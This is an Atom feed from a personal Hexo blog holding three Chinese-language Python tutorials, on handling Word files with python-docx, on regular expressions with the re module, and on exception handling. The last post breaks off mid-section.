<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>故园遗剑</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-10-09T07:30:56.311Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>mys3t</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python-处理word文件</title>
    <link href="http://yoursite.com/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/"/>
    <id>http://yoursite.com/2020/10/09/Python-处理word文件/</id>
    <published>2020-10-09T06:28:51.000Z</published>
    <updated>2020-10-09T07:30:56.311Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>Word是二进制(binary)文件，同时Word还有字体格式、色彩与版面配置等，所以它的处理方式比起文本文件(txt)要复杂。</p><p>需要使用外部模块python-docx。安装指令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-docx</span><br></pre></td></tr></table></figure><p>导入模块指令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import docx</span><br></pre></td></tr></table></figure><h2 id="python中的word文件结构"><a href="#python中的word文件结构" class="headerlink" title="python中的word文件结构"></a>python中的word文件结构</h2><p>在python-docx模块内，将Word文件结构分成3层：</p><p>1、Document：这是最高层代表整个Word文件。</p><p>2、Paragraph：一个Word文件是由许多的段落所组成，在Python中整份文件的定义是Document，这些段落的定义就是Paragraph对象。我们使用Word编辑文件时，如果单击一次Enter键，会产生一个新的段落。在Python中一个段落代表一个Paragraph对象，所有段落以Paragraph对象列表(list)方式存在。</p><p>3、Run：Word文件要考虑的有字号、字体样式、色彩等，我们将这些称作样式。一个Run对象所指的是Paragraph对象中相同样式的连续文字，如果文字发生样式变化，Python将以新的Run对象代表。</p><h2 id="读取word文件内容"><a href="#读取word文件内容" class="headerlink" title="读取word文件内容"></a>读取word文件内容</h2><h4 id="建立docx对象"><a href="#建立docx对象" class="headerlink" title="建立docx对象"></a>建立docx对象</h4><p>首先需建立Word文件(Document)的对象docx对象，可用Document( )方法建立。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mydoc &#x3D; docx.Document(&#39;文件名&#39;)  #建立docx对象mydoc</span><br></pre></td></tr></table></figure><h4 id="获得paragraph和Run数量"><a href="#获得paragraph和Run数量" class="headerlink" title="获得paragraph和Run数量"></a>获得paragraph和Run数量</h4><p>使用len()方法获得paragraph数量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(mydoc.paragraphs)</span><br></pre></td></tr></table></figure><p>下列语法可以获得第n段paragraph的Run数量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(mydoc.paragraphs[n].runs)  #n是第几段或者paragraph编号</span><br></pre></td></tr></table></figure><h4 id="列出paragraph的内容"><a href="#列出paragraph的内容" class="headerlink" title="列出paragraph的内容"></a>列出paragraph的内容</h4><p>打印第n段Paragraph内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(mydoc.paragraphs[n].text)</span><br></pre></td></tr></table></figure><h4 id="列出paragraph内run的内容"><a href="#列出paragraph内run的内容" class="headerlink" title="列出paragraph内run的内容"></a>列出paragraph内run的内容</h4><p>打印第n段Paragraph第m个Run内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(mydoc.paragraphs[n].runs[m].text)</span><br></pre></td></tr></table></figure><h4 id="读取文件与适度编排输出"><a href="#读取文件与适度编排输出" class="headerlink" title="读取文件与适度编排输出"></a>读取文件与适度编排输出</h4><p>word内容为：</p><p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009145349672.png" alt="image-20201009145349672"></p><p>程序内容为：</p><p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009145501800.png" alt="image-20201009145501800"></p><h2 id="存储文件"><a href="#存储文件" class="headerlink" title="存储文件"></a>存储文件</h2><p>save( )方法可以存储Document对象的文件，如果将建立Word文件与存储Word文件整个语法串连，整个语法如下：</p><p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009150028841.png" alt="image-20201009150028841"></p><h2 id="建立文件内容"><a href="#建立文件内容" class="headerlink" title="建立文件内容"></a>建立文件内容</h2><h4 id="建立标题"><a href="#建立标题" class="headerlink" title="建立标题"></a>建立标题</h4><p>使用add_heading( )方法建立文件标题内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mydoc.add_heading(&#39;content of head&#39;)  #mydoc为自建的文件对象</span><br></pre></td></tr></table></figure><p>Word的标题有1-9，如果想建立不同的标题可以使用第2个参数‘level=n’。</p><p>使用下列语法在建立文件标题内容同时设定标题格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mydoc.add_heading(&#39;content of head&#39;,level&#x3D;n)</span><br></pre></td></tr></table></figure><h4 id="建立段落paragraph内容"><a href="#建立段落paragraph内容" class="headerlink" title="建立段落paragraph内容"></a>建立段落paragraph内容</h4><p>可以使用add_paragraph( )方法建立文件的段落（也可称Paragraph）内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr &#x3D; mydoc.add_paragraph(&#39;content of paragraph&#39;)</span><br></pre></td></tr></table></figure><p>未来插入段落时可以将新段落插入此段落的前面，或是将Run内容插入此段落内。可以使用insert_paragraph_before( )方法，将段落插在上述ptr段落对象的前方。</p><p>如先插入2个段落，然后将新段落插在第一个段落的前面：</p><p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009150606065.png" alt="image-20201009150606065"></p><h4 id="建立run内容"><a href="#建立run内容" class="headerlink" title="建立run内容"></a>建立run内容</h4><p>Paragraph是由Run组成，当我们建立Paragraph成功后，未来若是想要在Paragraph内插入内容，可以使用add_run( )方法，此方法的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr.add_run(&#39;content of run&#39;)  #ptr是段落对象</span><br></pre></td></tr></table></figure><h4 id="强制换页输出"><a href="#强制换页输出" class="headerlink" title="强制换页输出"></a>强制换页输出</h4><p>add_page_break( )方法可以强制Word换页。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mydoc.add_page_break( )</span><br></pre></td></tr></table></figure><p>如果有插入段落时，会在新一页出现。</p><h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><p>使用add_picture( )方法插入图片到Word文件内，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mydoc.add_picture(&#39;image_file&#39;)</span><br></pre></td></tr></table></figure><p>如果插入图片时想要设定图片的宽度或高度，需导入docx.shared模块，然后就可以在add_picture( )方法内增加使用第2个参数width(宽度)或height(高度)，然后用Inches( )英寸函数或Cm( )公分函数设定图片宽度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from docx.shared import Inches</span><br><span class="line">mydoc.add_picture(&#39;image_file&#39;,width&#x3D;Inches(宽度值))</span><br></pre></td></tr></table></figure><h2 id="建立表格"><a href="#建立表格" class="headerlink" title="建立表格"></a>建立表格</h2><p>add_table( )方法可以建立表格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#x3D; mydoc.add_table(rows&#x3D;?,cols&#x3D;?) #执行完返回table表格对象</span><br></pre></td></tr></table></figure><h4 id="建立表格内容"><a href="#建立表格内容" class="headerlink" title="建立表格内容"></a>建立表格内容</h4><p>一次处理一列的表格内容，如下：</p><p>row = table.rows[0]</p><p>row.cell[0].text = ‘表格(0,0)的内容’</p><p>row.cell[1].text = ‘表格(0,1)的内容’</p><h4 id="插入表格列"><a href="#插入表格列" class="headerlink" title="插入表格列"></a>插入表格列</h4><p>使用add_row( )插入表格列。</p><h4 id="打印表格内容"><a href="#打印表格内容" class="headerlink" title="打印表格内容"></a>打印表格内容</h4><p>可以使用双层循环打印表格内容：</p><p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009152358214.png" alt="image-20201009152358214"></p><h4 id="表格的样式"><a href="#表格的样式" class="headerlink" title="表格的样式"></a>表格的样式</h4><p>可以使用table.style设定框线。</p><p>设定表格的样式，LightShading是浅色底纹，Accent1是辅色1，若是调整为Accent2，……，Accent6将有不同的结果，LightShading-Accept1。</p><h2 id="paragraph样式"><a href="#paragraph样式" class="headerlink" title="paragraph样式"></a>paragraph样式</h2><p>Paragraph样式就是所谓的段落样式，下列是常见的Word样式内容。</p><p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009152616751.png" alt="image-20201009152616751"></p><p>在插入段落时，可以在add_paragraph( )方法内增加第2个参数“style=样式名称”，这样就可以在插入段落同时设定段落的样式。</p><h2 id="Run的样式"><a href="#Run的样式" class="headerlink" title="Run的样式"></a>Run的样式</h2><p>Run的样式重点就是设定Run的文字(text)属性，下列是常见的属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bold 粗体</span><br><span class="line">italic 斜体</span><br><span class="line">underline 下划线</span><br><span class="line">strike 删除线</span><br></pre></td></tr></table></figure><p>当我们建立一个Run对象时，会回传Run对象，此时若将此对象的样式设为True，相当于可以建立该Run对象的样式。</p><p>如建立Run内容，然后设定此内容的属性为粗体(bold)与斜体：</p><p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009153002680.png" alt="image-20201009153002680"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-正则表达式</title>
    <link href="http://yoursite.com/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://yoursite.com/2020/10/06/Python-正则表达式/</id>
    <published>2020-10-06T10:23:20.000Z</published>
    <updated>2020-10-09T06:24:32.699Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>Python有关正则表达式的方法是在re模块内，使用正则表达式需要导入re模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure><h4 id="搜寻字符串模式"><a href="#搜寻字符串模式" class="headerlink" title="搜寻字符串模式"></a>搜寻字符串模式</h4><p>正则表达式是一种文本模式的表达方法，在这个方法中使用\d表示0—9的数字字符。由逸出字符的观念可知，当字符串放入函数内需增加‘\’，所以整个正则表达式的使用方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;\\d\\dd\\d\\d\\d-\\d\\d\\d\\d&#39;</span><br><span class="line">或r&#39;\d\dd\d\d\d-\d\d\d\d&#39;</span><br></pre></td></tr></table></figure><h4 id="使用re-compile-建立Regex对象"><a href="#使用re-compile-建立Regex对象" class="headerlink" title="使用re.compile( )建立Regex对象"></a>使用re.compile( )建立Regex对象</h4><p>Regex是Regular expression的简称，在re模块内有compile( )方法，可以将欲搜寻字符串的正则表达式当作字符串参数放在此方法内，然后会传回一个Regex对象。</p><p>如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rule &#x3D; re.compile(r&#39;\d\dd\d\d\d-\d\d\d\d&#39;)</span><br><span class="line"></span><br><span class="line">对于重复出现的字符串可以用大括号内部加上重复次数方式表达：</span><br><span class="line">rule &#x3D; re.compile(r&#39;\d&#123;4&#125;-\d&#123;3&#125;&#39;)</span><br></pre></td></tr></table></figure><h4 id="搜寻对象"><a href="#搜寻对象" class="headerlink" title="搜寻对象"></a>搜寻对象</h4><p>在Regex对象内有search( )方法，可以由Regex对象启用，然后将欲搜寻的字符串放在这个方法内，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb &#x3D; rule.search(msg)</span><br></pre></td></tr></table></figure><p>如果找不到比对相符的字符串会传回None，如果找到比对相符的字符串会将结果传回所设定的变量对象。</p><h4 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h4><p>这个方法会将搜寻到的目标用列表方式传回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rule &#x3D; re.compile(r&#39;\d\dd\d\d\d-\d\d\d\d&#39;) #建立rule对象</span><br><span class="line">mb &#x3D; rule.findall(string)  #string是欲搜寻的字符串</span><br></pre></td></tr></table></figure><p>findall( )函数由rule对象启用，最后会将搜寻结果的列表传给mb，只要打印mb就可以得到执行结果。</p><h4 id="使用小括号分组"><a href="#使用小括号分组" class="headerlink" title="使用小括号分组"></a>使用小括号分组</h4><p>括号分组是以连字符“-”区别，然后用小括号隔开群组。如下面两个分组：</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007093232469.png" alt="image-20201007093232469"></p><h4 id="使用管道"><a href="#使用管道" class="headerlink" title="使用管道"></a>使用管道</h4><p>|(pipe)在正规表示法称管道，使用管道我们可以同时搜寻比对多个字符串，例如，想要搜寻Mary和Tom字符串，可以使用下列表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patter &#x3D; &#39;mary|tom&#39;  #注意单引号&#39;和|旁不留空白</span><br></pre></td></tr></table></figure><h4 id="使用？做搜寻"><a href="#使用？做搜寻" class="headerlink" title="使用？做搜寻"></a>使用？做搜寻</h4><p>在正则表达式中若某些括号内的字符串或正则表达式可有可无，执行搜寻时皆算成功，例如，na字符串可有可无，表达方式是(na)?。</p><h4 id="使用-做搜寻"><a href="#使用-做搜寻" class="headerlink" title="使用*做搜寻"></a>使用*做搜寻</h4><p>在正则表达式中若某些字符串或正则表达式可从0到多次，执行搜寻时皆算成功，例如，na字符串可从0到多次，表达方式是(na)*。</p><h4 id="使用-做搜寻-1"><a href="#使用-做搜寻-1" class="headerlink" title="使用+做搜寻"></a>使用+做搜寻</h4><p>在正则表达式中若是某些字符串或正则表达式可从1到多次，执行搜寻时皆算成功，例如，na字符串可从1到多次，表达方式是(na)+。</p><h4 id="搜寻时忽略大小写"><a href="#搜寻时忽略大小写" class="headerlink" title="搜寻时忽略大小写"></a>搜寻时忽略大小写</h4><p>搜寻时若是在search( )或findall( )内增加第三个参数re.I或re.IGNORECASE，搜寻时就会忽略大小写，至于打印输出时将以原字符串的格式显示。</p><p>如以忽略大小写方式执行找寻相符字符串：</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007094336734.png" alt="image-20201007094336734"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007094405095.png" alt="image-20201007094405095"></p><h4 id="使用大括号设定比对次数"><a href="#使用大括号设定比对次数" class="headerlink" title="使用大括号设定比对次数"></a>使用大括号设定比对次数</h4><p>大括号除了可以设定重复次数，也可以设定指定范围，例如，(son){3,5}代表所搜寻的字符串如果是‘sonsonson’‘sonsonsonson’或‘sonsonsonsonson’皆算是相符合的字符串。</p><h4 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h4><p>如使用搜寻模式‘(son){3,5}’，搜寻字符串‘sonsonsonsonson’。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007095020973.png" alt="image-20201007095020973"></p><p>上述程序所设定的搜寻模式可知3、4或5个son重复就算找到了，可是Python执行结果是列出最多重复的字符串，5次重复，这是Python的默认模式，这种模式又称贪婪(greedy)模式。</p><p>另一种是列出最少重复的字符串，称非贪婪模式，方法是在正则表达式的搜寻模式右边增加？符号。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007095124395.png" alt="image-20201007095124395"></p><h2 id="正则表达式的特殊字符"><a href="#正则表达式的特殊字符" class="headerlink" title="正则表达式的特殊字符"></a>正则表达式的特殊字符</h2><h4 id="特殊字符表"><a href="#特殊字符表" class="headerlink" title="特殊字符表"></a>特殊字符表</h4><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007095540458.png" alt="image-20201007095540458"></p><h4 id="字符分类"><a href="#字符分类" class="headerlink" title="字符分类"></a>字符分类</h4><p>python中可以用中括号来设定字符。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[a-z]：代表a-z的小写字符</span><br><span class="line">[A-Z]：代表A-Z的大写字符</span><br><span class="line">[aeiouAEIOU]：代表英文发音的元音字符</span><br><span class="line">[2-5]：代表2-5的数字</span><br></pre></td></tr></table></figure><p>在字符分类中，中括号内可以不用放上正则表示法的反斜杠\执行.、?、*、(、)等字符的转译。</p><h4 id="字符分类的-字符"><a href="#字符分类的-字符" class="headerlink" title="字符分类的^字符"></a>字符分类的^字符</h4><p>中括号内的左方加上^字符，意义是搜寻不在这些字符内的所有字符。</p><p>在正规表示法中起始位置加上^字符，表示正则表示法的字符串必须出现在被搜寻字符串的起始位置，这样搜寻成功才算成功。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009135707635.png" alt="image-20201009135707635"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009135738751.png" alt="image-20201009135738751"></p><h4 id="正则表示法的-字符"><a href="#正则表示法的-字符" class="headerlink" title="正则表示法的$字符"></a>正则表示法的$字符</h4><p>正则表示法的末端放置$字符时，表示正则表示法的字符串必须出现在被搜寻字符串的最后位置，这样搜寻成功才算成功。</p><h4 id="单一字符使用通配符“-”"><a href="#单一字符使用通配符“-”" class="headerlink" title="单一字符使用通配符“.”"></a>单一字符使用通配符“.”</h4><p>通配符(wildcard)“.”表示可以搜寻除了换行字符以外的所有字符，但是只限定一个字符。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009140029088.png" alt="image-20201009140029088"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009140048223.png" alt="image-20201009140048223"></p><h4 id="所有字符使用通配符“-”"><a href="#所有字符使用通配符“-”" class="headerlink" title="所有字符使用通配符“.*”"></a>所有字符使用通配符“.*”</h4><p>“.”字符与“*”组合，可以搜寻所有字符，意义是搜寻0到多个通配符（换行字符除外）。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009140223690.png" alt="image-20201009140223690"></p><h4 id="换行字符的处理"><a href="#换行字符的处理" class="headerlink" title="换行字符的处理"></a>换行字符的处理</h4><p>用“.*”搜寻时碰上换行字符，搜寻就停止。Python的re模块提供参数re.DOTALL，功能是包括搜寻换行字符，可以将此参数放在search( )、findall( )或compile( )。</p><h2 id="MatchObject对象"><a href="#MatchObject对象" class="headerlink" title="MatchObject对象"></a>MatchObject对象</h2><h4 id="re-match"><a href="#re-match" class="headerlink" title="re.match( )"></a>re.match( )</h4><p>re.search( )搜寻字符串，搜寻成功时可以产生MatchObject对象，re.match( )方法搜寻成功后也将产生MatchObject对象。</p><p>这个方法其实和re.search( )相同，差异是re.match()只搜寻比对字符串开始的字，如果失败就算失败。re.search( )则是搜寻整个字符串。至于re.match( )搜寻成功会传回MatchObject对象，若是搜寻失败会传回None，这部分与re.search( )相同。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009141736734.png" alt="image-20201009141736734"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009141801562.png" alt="image-20201009141801562"></p><h4 id="MatchObject几个重要的方法"><a href="#MatchObject几个重要的方法" class="headerlink" title="MatchObject几个重要的方法"></a>MatchObject几个重要的方法</h4><p>当使用re.search( )或re.match( )搜寻成功时，会产生MatchOjbect对象。</p><p>Python提供下列取得MatchObject对象内容的重要方法。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009141921625.png" alt="image-20201009141921625"></p><p>如分别使用re.match( )和re.search( )搜寻字符串Joah，成功搜寻到字符串时，分别用start( )、end( )和span( )方法列出字符串出现的位置。</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009142021370.png" alt="image-20201009142021370"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009142054105.png" alt="image-20201009142054105"></p><h4 id="sub-方法"><a href="#sub-方法" class="headerlink" title="sub()方法"></a>sub()方法</h4><p>Python re模块内的sub( )方法可以用新的字符串取代原本字符串的内容。</p><p>sub( )方法的基本使用语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result &#x3D; re.sub(pattern,newstr,msg)  # msg是整个要处理的字符串或句子</span><br></pre></td></tr></table></figure><p>pattern是欲搜寻的字符串，如果搜寻成功则用newstr取代，同时成功取代的结果回传给result变量，如果搜寻到多个相同字符串，这些字符串将全部被取代，需留意原先msg内容将不会改变。如果搜寻失败则将msg内容回传给result变量，当然msg内容也不会改变。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-异常处理</title>
    <link href="http://yoursite.com/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    <id>http://yoursite.com/2020/10/06/Python-异常处理/</id>
    <published>2020-10-06T08:38:13.000Z</published>
    <updated>2020-10-06T10:17:05.679Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="程序异常"><a href="#程序异常" class="headerlink" title="程序异常"></a>程序异常</h2><p>Python提供功能可以让我们捕捉异常和撰写异常处理程序，当发生异常被我们捕捉时会去执行异常处理程序，然后程序可以继续执行。</p><h4 id="try-except"><a href="#try-except" class="headerlink" title="try-except"></a>try-except</h4><p>发生异常被捕捉时程序会执行异常处理程序，然后跳开异常位置，再继续往下执行。这时要使用try -except指令，它的语法格式如下：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164108843.png" alt="image-20201006164108843"></p><p>执行try:下面的指令，如果正常则跳离except部分，如果指令有错误异常，则检查此异常是否是异常对象所指的错误，如果是代表异常被捕捉了，则执行此异常对象下面的异常处理程序。</p><h4 id="try-except-else"><a href="#try-except-else" class="headerlink" title="try-except-else"></a>try-except-else</h4><p>Python在try - except中又增加了else指令，这个指令存放的主要目的是try内的指令正确时，可以执行else内的指令区块，我们可以将这部分指令区块称正确处理程序，这样可以增加程序的可读性。此时语法格式如下：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164238383.png" alt="image-20201006164238383"></p><h4 id="FileNotFoundError"><a href="#FileNotFoundError" class="headerlink" title="FileNotFoundError"></a>FileNotFoundError</h4><p>一个常常发生的异常是打开文件时找不到文件，这时会产生FileNotFoundError异常。</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164341891.png" alt="image-20201006164341891"></p><h4 id="分析单一文件的字数"><a href="#分析单一文件的字数" class="headerlink" title="分析单一文件的字数"></a>分析单一文件的字数</h4><p>如设计一个计算文章字数的函数wordsNum，只要传递文章文件名，就可以获得此篇文章的字数。</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164602832.png" alt="image-20201006164602832"></p><h2 id="多组异常处理程序"><a href="#多组异常处理程序" class="headerlink" title="多组异常处理程序"></a>多组异常处理程序</h2><h4 id="常见的异常对象"><a href="#常见的异常对象" class="headerlink" title="常见的异常对象"></a>常见的异常对象</h4><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164750005.png" alt="image-20201006164750005"></p><p>Python提供了一个通用型的异常对象Exception，它可以捕捉各式的基础异常。</p><p>如程序的异常对象设为Exception：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164906040.png" alt="image-20201006164906040"></p><h4 id="捕捉多个异常"><a href="#捕捉多个异常" class="headerlink" title="捕捉多个异常"></a>捕捉多个异常</h4><p>在try: - except的使用中，可以设计多个except捕捉多种异常，此时语法如下：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165007916.png" alt="image-20201006165007916"></p><h4 id="使用一个except捕捉多个异常"><a href="#使用一个except捕捉多个异常" class="headerlink" title="使用一个except捕捉多个异常"></a>使用一个except捕捉多个异常</h4><p>Python也允许设计一个except，捕捉多个异常，此时语法如下：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165101291.png" alt="image-20201006165101291"></p><h4 id="使用Python内置的错误信息"><a href="#使用Python内置的错误信息" class="headerlink" title="使用Python内置的错误信息"></a>使用Python内置的错误信息</h4><p>Python支持发生异常时使用系统内置的异常处理信息。此时语法格式如下：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165216377.png" alt="image-20201006165216377"></p><p>e是系统内置的异常处理信息，e可以是任意字符。</p><h4 id="捕捉所有异常"><a href="#捕捉所有异常" class="headerlink" title="捕捉所有异常"></a>捕捉所有异常</h4><p>Python提供语法让我们可以一次捕捉所有异常，此时try - except语法如下：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165325759.png" alt="image-20201006165325759"></p><h2 id="丢出异常"><a href="#丢出异常" class="headerlink" title="丢出异常"></a>丢出异常</h2><p>Python直译器发现异常时，自行丢出异常对象，如果我们不处理程序就终止执行，如果我们使用try - except处理程序可以在异常中继续执行。</p><p>那么程序如果发生某些状况，我们自己将它定义为异常然后丢出异常信息，程序停止正常往下执行，同时让程序跳到自己设计的except去执行。它的语法如下：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165525546.png" alt="image-20201006165525546"></p><p>如目前有些金融机构在客户建立网络账号时，会要求密码长度必须在5到8个字符间，设计一个程序，这个程序内有passWord( )函数，这个函数会检查密码长度，如果长度小于5或是长度大于8皆抛出异常。</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165626571.png" alt="image-20201006165626571"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165649633.png" alt="image-20201006165649633"></p><h2 id="记录Traceback字符串"><a href="#记录Traceback字符串" class="headerlink" title="记录Traceback字符串"></a>记录Traceback字符串</h2><p>每次错误屏幕皆出现Traceback字符串，在这个字符串中指出程序错误的原因。导入traceback模块，就可以使用traceback.format_exc( )记录这个Traceback字符串。</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165921029.png" alt="image-20201006165921029"></p><h2 id="finally"><a href="#finally" class="headerlink" 